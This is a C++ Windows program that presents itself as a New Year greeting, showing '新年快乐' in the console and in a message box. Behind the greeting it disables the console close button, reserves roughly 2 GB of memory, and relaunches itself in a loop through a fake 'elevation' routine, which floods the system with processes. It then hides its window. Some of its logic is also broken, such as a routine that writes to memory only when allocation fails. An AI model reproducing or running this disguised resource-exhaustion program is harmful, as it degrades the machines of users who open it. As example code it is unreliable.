#include<bits/stdc++.h>
#include<Windows.h>
using namespace std;


VOID KillConsoleCloseButton()
{
    HWND hwnd = GetConsoleWindow();
    HMENU hmenu = GetSystemMenu(hwnd, FALSE);
    if (hmenu != NULL)
    {
        DeleteMenu(hmenu, SC_CLOSE, MF_BYCOMMAND);
    }
}

BOOL IsRunAsAdministrator()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:

    if (pAdministratorsGroup)
    {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fIsRunAsAdmin;
}

void ElevateNow()
{
num1: 
    if (!IsRunAsAdministrator())
    {
        HANDLE hToken;
        HANDLE hNewToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        {
            if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hNewToken))
            {
                char szPath[MAX_PATH];
                if (GetModuleFileName(NULL, szPath, sizeof(szPath) / sizeof(szPath[0])))
                {
                    
                    STARTUPINFO si;
                    PROCESS_INFORMATION pi;
                    ZeroMemory(&si, sizeof(si));
                    si.cb = sizeof(si);
                    si.lpDesktop = "winsta0\\default";
                    if (CreateProcessAsUser(hNewToken, szPath, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
                    {
                    	goto num1;
//                        CloseHandle(pi.hThread);
//                        CloseHandle(pi.hProcess);
                    }
                }
                CloseHandle(hNewToken);
            }
            CloseHandle(hToken);
        }
    }
    if (IsRunAsAdministrator())
    {
        cout << "Already Elevated" << endl;
    }
}

int proc()
{
    char *p = new char[1024*1024*1024];
    if(!p)
    {
    while(1)
    for(int i=0; i<1024*1024*1024; i++)
    p[i] = rand()%127;
    }
    return 1;
}

int main()
{	
    KillConsoleCloseButton();
    void *mem = malloc(1024*1024*1024);
    void *mem2 = VirtualAlloc(NULL, 1024*1024*1024, MEM_COMMIT, PAGE_READWRITE);	
    cout<<"新年快乐！！！";
    MessageBox(NULL,"新年快乐！！！","新年快乐！！！", MB_OK);
    proc();
    ElevateNow();    

	ShowWindow(GetConsoleWindow(), SW_HIDE);
    getchar();
    return 0;
}
